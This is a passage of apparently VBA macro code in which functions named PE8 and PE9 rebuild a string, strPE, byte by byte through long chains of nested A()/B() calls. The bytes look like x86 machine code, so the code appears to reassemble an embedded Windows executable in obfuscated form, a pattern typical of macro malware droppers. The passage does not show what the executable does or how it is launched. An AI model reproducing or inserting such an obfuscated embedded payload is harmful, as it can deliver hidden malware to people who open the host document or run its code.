    strPE = A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 0), "U"), 198), 139), "0"), 133), 246), "t+9"), 187), 8), "sG"), 139), 198), 139), "6"), 12), 246), "u"), 243), 139), "="), 12), 231), 192), 184), 6), "P"), 232), 9), "Sz"), 25), "h"), 0), " "), 0), 0), "j"), 156), "`"), 193), "@"), 235), 139), 240), 131), 186)
    strPE = A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(strPE, 4), 133), 246), "a"), 132), 217), 0), 0), 149), 141), "V"), 210), 141), 134), "( "), 0), 0), 164), "d"), 0), 0), 0), 0), 251), "~"), 8), 223), "V"), 16), 137), "F"), 20), 235), 143), 139), 22), 137), 16), 139), "{"), 208), 139), ":"), 8), 230), 248), 139), "C"), 139)
    strPE = B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(strPE, "Z"), 197), "M"), 28), 8), 187), 200), "v"), 3), 137), "C"), 8), 139), "C"), 12), "I"), 192), "t"), 6), "P"), 232), 175), "R"), 0), 0), 4), "N"), 24), 199), 6), 0), 0), 0), 0), 137), "N"), 16), 139), "~"), 16), 139), "M"), 16), 137), 177), 137), 221), 4), 141), "G")
    strPE = A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(strPE, "4"), 137), "G8"), 137), 216), 16), 137), "_"), 24), 139), "]"), 12), 137), "w0"), 137), "&,3"), 148), 137), "O"), 172), 140), 222), 137), 199), 4), 137), "w"), 16), 137), "w"), 20), 178), "w8"), 137), 164), 200), 137), "$"), 28), 137), "w$"), 137), "w"), 18)
    strPE = B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(strPE, 137), 31), "t"), 161), 165), "S"), 24), "R"), 232), "'"), 30), 255), 255), ";"), 198), 137), "E"), 16), "t"), 140), "K"), 232), 218), 169), 0), 0), 139), "E"), 16), 139), "K"), 4), 131), 195), 4), 141), "Wt"), 139), "L"), 137), "=t"), 3), 8), 161), 12), 137), ";;")
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(strPE, 198), 137), "_"), 12), 227), "4P"), 232), "&"), 165), 223), 0), 139), "E"), 8), 137), "/_^3"), 192), "P]"), 194), 16), "r"), 197), "E"), 207), 133), 208), 221), 7), "j"), 12), 255), 208), 131), 196), 4), "_^"), 184), 12), "C"), 0), 0), "[]"), 194)
    strPE = B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 16), 0), 137), ":"), 8), 137), "w"), 12), 139), "E"), 196), 137), 146), "_^3"), 192), "[]"), 194), 135), 0), 144), 144), "8"), 144), 144), 144), 144), 144), 144), 144), "U"), 145), 236), "D"), 236), " SV"), 18), 135), "}"), 8), 137), "}"), 236), "3"), 219), "J")
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "G,"), 137), "E"), 232), 139), "H"), 16), 137), 153), 224), 139), 13), 20), "J"), 198), "k"), 240), 201), 191), "U"), 228), 177), "]"), 212), 139), "H"), 16), 139), "P"), 20), ";"), 202), "u*"), 141), "U"), 3), "R"), 2), 162), 24), 0), 0), 131), 196), 4), 131), 248), 255)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(strPE, "fK"), 139), "GB;"), 161), "t;j"), 12), 255), 208), 131), 196), 4), "3"), 192), "_^"), 173), 139), "8]"), 10), "M"), 0), 139), "W"), 16), 139), "M"), 12), "P"), 141), "U"), 224), "QRh@S"), 228), 0), 232), 251), 30), 191), 0), 131)
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(strPE, 248), 255), "u"), 25), 139), "G ;"), 195), "t"), 7), "j_"), 255), 208), "+"), 196), "M_^3"), 192), "["), 139), 236), "]"), 29), "B"), 141), 139), "E"), 180), 198), 0), 0), 139), "M"), 243), "k"), 130), "D+"), 194), 137), "U"), 16), 131), 192), 8), "$")
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 248), 3), 194), 137), "A"), 16), 139), "96;"), 243), 15), 132), 160), 147), 0), 0), 139), 1), 24), 139), 177), 12), 133), 4), "t6P"), 232), 12), "P"), 0), 0), 139), "W9"), 139), 156), 137), "U"), 252), 249), "W"), 8), 137), "M"), 12), 139), 6), 248)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(strPE, "M"), 252), 137), "E"), 248), 168), "F"), 8), 164), 201), "t"), 10), 194), 144), 29), 6), 137), 30), 139), 204), 235), "a9"), 248), 19), 17), 175), 139), "L"), 135), 20), 133), 201), 137), 14), 162), 8), ";"), 184), 12), "v"), 161), 137), "E"), 12), 160), "t"), 135), 20), 235)
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(strPE, "2"), 6), "O"), 20), 137), 14), 137), "w"), 20), ";"), 208), "r"), 4), "+"), 208), 235), 30), "3"), 210), 139), "uP"), 133), "Pu"), 177), 11), "E"), 12), 137), "W"), 143), 159), 7), 139), 127), 12), 215), 255), "t"), 6), "W"), 232), 165), "P"), 0), 0), 133), 128), "t")
    strPE = A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(strPE, 20), 139), "50"), 193), "@"), 0), 139), 14), 139), 27), "P"), 255), 214), 131), 196), 4), 133), 219), "u"), 140), 139), "Uy"), 139), "X"), 8), 138), "E"), 240), 132), 192), "u"), 11), "_"), 213), 139), 194), "["), 139), 229), "]"), 194), 12), 0), 139), "M"), 232), 139), 181)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(strPE, ","), 199), "A"), 12), "v"), 0), 7), 171), 194), "P"), 4), 154), "Q"), 4), 16), 10), 137), 1), 137), "H"), 4), "[O,"), 139), "H"), 20), 139), "X"), 16), 139), "0+"), 203), 129), 193), 0), 16), 0), 0), 139), 214), 137), 225), 0), 170), 255), 3), "I"), 193)
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 167), 12), 137), 143), "$"), 139), "z"), 12), ";"), 159), "s!"), 139), 18), ";c"), 12), "r"), 249), 139), "H"), 4), 137), "g"), 183), "L"), 139), "p"), 4), 137), "q"), 4), 139), "J"), 4), 242), 251), 4), 137), 1), 137), 16), 137), "B"), 4), 139), "E"), 16), "_"), 244)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "["), 139), 229), 151), 194), 12), 0), 248), 144), 144), 144), 144), "U"), 139), 236), 131), 236), 16), 139), "U"), 8), "\VW"), 139), "ZT"), 139), 243), 139), "z"), 12), "+C"), 16), 137), "E"), 183), 141), 12), 0), 131), 249), " s"), 5), 241), " "), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(strPE, 0), 141), "z"), 16), 0), 139), 3), 180), "{"), 139), "p"), 20), "+p"), 16), ";"), 206), "wq"), 139), "H"), 4), 139), "0"), 137), "1"), 240), 8), 139), "p"), 4), 137), 162), 237), 139), "K'"), 137), 235), 215), 137), 1), 137), 24), 137), 241), 4), 252), "@"), 12)
    strPE = B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 0), 27), 0), 0), 137), "g,"), 139), "C"), 20), 139), "K"), 16), 139), "3"), 195), 193), 139), 206), 5), 253), "R"), 0), 0), 235), "X"), 240), "G"), 188), "H"), 193), 140), 12), 137), "C"), 12), ";A"), 12), "s!"), 139), 9), ";A"), 12), "r"), 249), 139), "C")
    strPE = A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(strPE, 4), 137), "0"), 139), 3), 139), "s"), 4), 137), "p"), 4), 139), "A"), 4), 137), "C"), 4), "b"), 24), 131), 11), 137), "Y"), 4), 139), "G,"), 233), 233), 0), 0), 0), 139), "w"), 24), 141), 129), 23), "4"), 226), 0), "%s"), 240), "K"), 255), ";"), 193), 153), 176)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 252), 15), 130), 189), 1), "~"), 0), 189), 0), "'"), 0), 0), "s"), 10), "CE"), 252), "?"), 144), 0), 141), "VE"), 252), 139), 248), 193), 239), 12), "O"), 13), 255), 255), 137), "}"), 248), 15), 135), 154), 1), 0), 0), 245), ">"), 15), 135), 231), 0), 0), 0)
    strPE = A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(strPE, 139), "F"), 12), 133), 192), "t"), 6), "P"), 232), 149), "N"), 0), 0), 131), "|"), 190), "N"), 214), 139), 254), 141), "D"), 177), 20), 139), 215), "SU"), 248), "u"), 16), ";"), 209), "s"), 9), 131), 225), 4), "Bj"), 166), 0), "t"), 243), 137), "?"), 248), 139), 16), 133)
    strPE = B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(strPE, 210), 137), "U"), 240), "J"), 132), 156), 0), 0), 0), 139), "q"), 133), 255), 137), "8u"), 22), "9Mm"), 11), 17), 139), "h"), 252), 131), 232), 236), 31), 133), 255), "u"), 184), "A"), 201), "w"), 208), 137), "M"), 139), "Jb"), 235), "F"), 8), 3), 193), 137), "F")
    strPE = A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(strPE, 8), 139), 200), "cF"), 4), "Y"), 200), "v"), 3), 137), "("), 8), 139), "v"), 12), 133), 246), "t"), 232), "V"), 232), " N"), 0), 0), 139), "U"), 240), 213), "Bq"), 199), 2), 0), 240), 0), 0), 137), "B"), 16), 139), 194), 139), "U"), 8), 138), "J"), 16), 132)
    strPE = B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(strPE, 201), 187), 8), 139), "J"), 20), 137), 151), "W"), 177), 20), 198), 190), 16), ":"), 139), "M"), 244), 139), "y"), 16), 139), "x"), 16), 139), 217), 193), 233), 2), 243), 165), 139), 203), 170), 225), 3), 243), 164), 137), "B"), 8), 139), "H"), 16), 139), 243), "_"), 157), "P^")
    strPE = A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(strPE, 180), 10), 139), "@"), 20), "H["), 137), "B"), 4), "3"), 192), 139), 147), "]"), 195), 139), "v"), 222), 133), 246), "t("), 28), 232), "-N"), 0), 0), 235), "AiN"), 20), 133), "Ft"), 147), 139), "F"), 12), 133), 192), "t"), 9), "P"), 232), 154), "M"), 192)
    strPE = B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 0), 139), "U"), 8), 139), "~"), 1), 141), "F"), 20), 133), 255), "t"), 16), 21), "M"), 236), ";O^vF"), 139), 250), 176), ")"), 133), 129), 192), 240), 139), "v"), 12), 133), "wt"), 6), "V"), 232), 155), "M"), 0), "K"), 139), 182), 248), 139), "E"), 252), "P")
    strPE = B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(strPE, 255), 21), "\"), 193), "@"), 0), 131), 196), "8"), 133), 192), "tY"), 139), "M"), 252), 141), "P"), 24), 137), "P"), 199), 199), 0), 0), 0), 30), 0), 141), 20), 8), 137), "x"), 8), 137), "P"), 20), 233), "9"), 255), 255), 255), 139), 15), 137), 30), 159), "G"), 7), "q")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "8"), 8), 3), 200), 139), "F"), 4), ";"), 200), 137), "N"), 8), "v"), 156), 137), "o"), 8), 197), "v"), 146), 133), 246), ")"), 210), " "), 233), 150), "X"), 0), 0), "~U"), 8), 141), "\"), 24), 232), 7), 0), 0), 0), 0), 137), "O"), 16), 139), 12), 233), 0), 255)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(strPE, 255), "i_^"), 131), 28), 255), "["), 139), 11), "]"), 195), 144), 144), 203), 34), 232), 144), "U~"), 236), 139), "M"), 12), 139), 185), 8), 13), "E"), 16), "P#R"), 232), "|"), 251), 255), 253), "]"), 195), 242), 144), 144), 144), 144), 187), 248), 144), 144), 144)
    strPE = A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(strPE, "U"), 139), 236), 139), "M+"), 12), "E"), 12), 208), "$(]"), 194), 8), 0), "U"), 139), 236), "="), 139), "u"), 8), 133), 246), 192), "0"), 139), "F"), 20), 133), 192), "t"), 7), 139), 204), 137), "N%"), 235), 8), "j"), 226), "V"), 214), "1"), 244), 255), 255), 180)

    PE8 = strPE
End Function

Private Function PE9() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(strPE, "U"), 224), "HM"), 132), 137), "P"), 4), 139), "U"), 20), 137), "HQ+P"), 12), 139), "NN"), 137), 8), 137), 239), 16), "^]"), 194), 16), 0), "U"), 139), 236), 139), "8"), 8), "SV"), 225), 133), 210), "t_"), 139), "B"), 16), 139), "x"), 16), 139)
    strPE = B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(strPE, "}"), 12), 141), "J"), 16), 133), 192), "t 9x"), 4), "u"), 5), "9p"), 248), "t"), 10), 139), 200), 139), 0), 5), "4u"), 238), 235), 12), 6), 24), 137), 25), 139), "J"), 20), 137), 8), 137), "B"), 20), 139), "B8"), 141), "J8;"), 192), "t")
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(strPE, "j"), 29), "4"), 4), "u"), 5), "9p"), 8), "t5"), 139), 200), "%"), 0), 182), 192), "u"), 238), "_^[]"), 203), 12), 0), 139), 191), 137), "1"), 139), 194), "-"), 137), 8), 137), "B<_^r"), 20), 175), 12), 0), 18), 144), 144), 144), 159)
    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 144), 144), 144), 178), 144), 144), 144), "*U"), 139), 236), 139), "E"), 8), "V"), 139), "u"), 16), "W"), 139), "}"), 12), "VWP"), 232), "j"), 255), 255), 255), 22), 255), 214), 168), 196), 4), "_^]"), 194), 14), 0), "^"), 144), 144), 144), 144), 144), 144), 144)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(strPE, 144), 190), "i"), 144), 144), 144), "U"), 139), 236), "V"), 139), "u"), 8), 139), 6), 133), 192), "1"), 20), 139), 237), 157), 14), 140), "P"), 4), "R"), 255), "P"), 8), 145), 6), 134), 130), 179), 211), 192), 155), 236), "^]"), 194), 144), 144), ","), 144), 144), 144), 144), 144)
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 144), 144), 144), 144), "3"), 192), 195), 144), 144), 202), "-"), 144), 144), 144), 144), 144), 144), 144), 144), 220), "i"), 139), 236), 131), 236), 8), "~"), 139), 253), 8), "Wu"), 141), 141), "O"), 15), 132), 219), 0), 0), 0), "V"), 139), 18), 139), 6), "%?j"), 237)
    strPE = B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(strPE, "j"), 0), "P"), 232), "ZM"), 0), 0), 132), "v"), 17), 1), 0), "t"), 7), 199), "F"), 4), 0), 0), 0), "G"), 139), "v"), 8), 133), 246), 11), 188), 139), 243), 139), 130), 4), 133), 192), "+"), 18), 139), 14), 191), 1), 0), 0), 0), "j"), 9), "Q"), 137), "~")
    strPE = B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 4), 232), "JL"), 0), 0), 139), "v"), 8), "h"), 246), "u"), 224), 133), 255), "tu"), 187), 27), 183), 0), 0), "VS"), 137), "u"), 252), 232), 192), 166), 0), 0), 139), "u"), 8), "3"), 223), 131), "~_"), 131), ")#"), 139), 22), "j"), 1), "j"), 144), "j")
    strPE = A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(strPE, 0), "R"), 232), 247), "L"), 0), 0), "= "), 188), 129), 0), "u"), 7), 191), 234), 0), 0), 0), 235), 5), 244), 221), 4), 0), 0), 0), 0), 139), "v"), 188), 133), 246), "uk"), 133), 255), "t*"), 139), "u"), 252), 133), 246), 127), 212), "|"), 230), 129), 251)
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(strPE, 190), 198), "Yhs"), 25), "VS"), 232), "o"), 21), 0), 0), "j"), 0), "jvVSxD]"), 0), 0), 139), 216), 137), "U"), 252), 1), 14), 202), "]"), 8), 139), 243), 131), "~"), 4), 2), "u"), 10), 139), 6), 141), 9), "P"), 12), 184), "K")
    strPE = B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 0), 139), 218), 8), 165), 246), "u"), 233), 139), 243), 5), "F"), 4), 133), 192), "t"), 14), 139), 14), "j"), 0), "j"), 0), "j"), 0), "Q"), 198), 134), "L"), 0), 0), 139), 211), "X"), 133), 246), "u"), 228), "^_["), 139), 229), "]"), 195), 144), 254), "M5")
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(strPE, 144), 144), "+"), 144), 144), 144), 168), 144), "U"), 139), 163), "V1"), 197), 10), "3"), 192), 243), 246), 13), "+W"), 193), 254), 131), 201), "I"), 242), 174), 139), "E"), 151), 247), 209), "I"), 139), 249), "sW"), 161), 232), 235), 241), 255), 255), 139), 138), 139), 248), 139)
    strPE = A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 209), 193), 233), 2), 243), 165), "r"), 202), 162), 225), 186), 243), 164), "_"), 182), "]"), 194), 8), 0), 144), 144), "L"), 2), 139), 236), 131), 236), "$SVW"), 156), 34), 12), "3"), 219), "3"), 210), 133), 11), "t#"), 141), "u"), 12), "8"), 201), 255), 149), 192)
    strPE = A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 145), 174), 247), 209), 29), 194), 251), 6), "}"), 5), 137), "L"), 134), 220), "C"), 139), "k"), 4), 131), 198), 4), 3), 209), 133), 255), "u"), 224), 139), "E"), 8), "BRP"), 232), 142), 241), 255), 255), "Bu"), 12), "r"), 201), "@"), 246), 137), "E"), 244), 139), 208)
    strPE = A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(strPE, 175), "M"), 252), "tN"), 212), "E"), 12), 137), 239), 248), 235), 3), 139), 242), 252), 131), 249), 6), "}t"), 217), 135), 141), 220), "A"), 137), "M"), 169), "Y"), 14), 139), 254), 17), 201), 255), 234), 192), 242), 174), 247), 251), "-"), 139), "["), 139), 200), 139), 192), 139)
    strPE = A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 217), 27), 208), 193), 215), 2), 243), 142), 139), "E"), 248), 139), 203), 131), 225), 3), 131), 147), 4), 243), 164), 139), "4"), 137), "E"), 248), 133), 246), "u"), 189), 139), "E"), 244), "_:"), 198), 2), 0), "["), 139), 229), "]"), 195), 144), 144), 144), 144), 144), "U"), 139)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 236), 131), 236), 8), "f"), 139), "T"), 200), 243), "@"), 0), 161), 244), 243), "@"), 0), 138), 249), 202), 243), "@"), 0), "SV"), 139), "u"), 12), "f"), 137), "M*"), 200), 248), 8), 133), 246), "W"), 137), "E"), 248), 136), 156), 254), 141), 207), 248), 127), "V|"), 4)
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(strPE, 133), 201), "s"), 31), 139), 217), 16), 139), 21), 188), 243), "1"), 0), 139), 200), "_^["), 137), 17), 5), 129), 192), 243), "@"), 206), 136), "Q"), 4), 139), 229), "]"), 194), "}"), 0), 133), 246), 127), "-"), 170), 8), 251), 249), 198), 3), 0), 23), "s"), 7), 139)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(strPE, 131), 16), "Qh"), 180), 243), "@"), 228), "j"), 5), "V"), 232), 202), ",|0"), 131), 196), 16), "d"), 192), 139), 159), 15), 141), 229), "C"), 0), 0), "j"), 205), 0), 0), 0), 139), 249), 242), 193), 139), 214), 185), 10), 13), 0), 0), 129), 231), 255), 24), 0)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 232), "2^"), 186), 0), 139), 242), 139), 200), 133), 246), "~p"), 127), 8), 129), 249), 205), 3), 0), 14), "r"), 3), "C"), 235), 213), 133), 246), "!"), 186), 127), "j"), 131), 249), 9), "rX}"), 249), 9), "u"), 211), 133), "Vu5"), 254), 255), 1)
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 3), 0), 0), "|G"), 17), 255), 0), 205), 0), 175), 161), 6), 131), 193), "E"), 131), 214), 0), 15), 190), 3), 139), "u"), 16), 12), 209), "h"), 172), 243), "@"), 0), "j"), 5), "V"), 232), "N,"), 0), 0), "="), 196), 20), 133), "$sm"), 139), 21), 13)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 243), "S"), 0), 203), 206), 132), 137), 17), "i"), 168), 243), 171), 0), 136), "A"), 4), 139), 198), "^["), 139), 229), "O"), 194), "E"), 0), 199), "\"), 191), 0), 187), 216), 0), 153), 129), 226), 255), 1), 0), 0), 3), 194), 193), 248), 9), 147), 141), 10), "|"), 167)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 131), 193), 169), 131), 214), 0), "3"), 192), 15), 190), 19), 139), "u"), 16), "RPQh"), 156), "(@"), 0), "%AV#"), 244), 158), "_m"), 131), 196), 24), 133), 192), "}"), 19), 139), 198), 139), 13), 164), 243), "@"), 0), 137), 8), 138), 153), 144)
    strPE = A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "@"), 248), "BAIC'"), 152), "B"), 146), "7"), 144), "B"), 253), "/@"), 155), "7H"), 159), "I'HJC"), 253), "@"), 146), "'"), 145), "K@"), 146), "7?"), 155), "CC"), 153), 153), "I"), 214), "'I"), 245), "/"), 245), 147), 159), 145)
    strPE = B(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "H/K"), 253), "?"), 249), "?"), 159), "/K/"), 245), "A"), 146), "J"), 145), 159), "/"), 146), 159), 144), "/"), 245), 155), 155), 144), 249), 252), 252), "7A'H?H"), 147), 147), "H"), 245), "?"), 249), 146), 147), 159), "I"), 249), "@"), 252), "'@")
    strPE = A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(strPE, "?"), 144), 144), "CC'B"), 145), 249), 159), "?I"), 253), "B"), 248), "@"), 249), "/"), 245), 146), "C"), 214), 155), "@"), 248), 245), "B"), 144), "7"), 249), 144), 253), 249), 153), 248), 159), 147), 153), "'?"), 147), 214), 147), "@B"), 245), "BA"), 155), 152)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(strPE, 152), "C"), 144), 249), 152), "'"), 253), 147), 153), 155), 146), "I"), 144), 152), "K"), 159), 159), 159), "?"), 245), "IKH"), 214), 214), 145), 249), "IC"), 155), 144), 153), "?I"), 248), 253), 146), 214), 214), 252), "7/"), 249), 144), 153), 253), 248), 159), 145), 144)
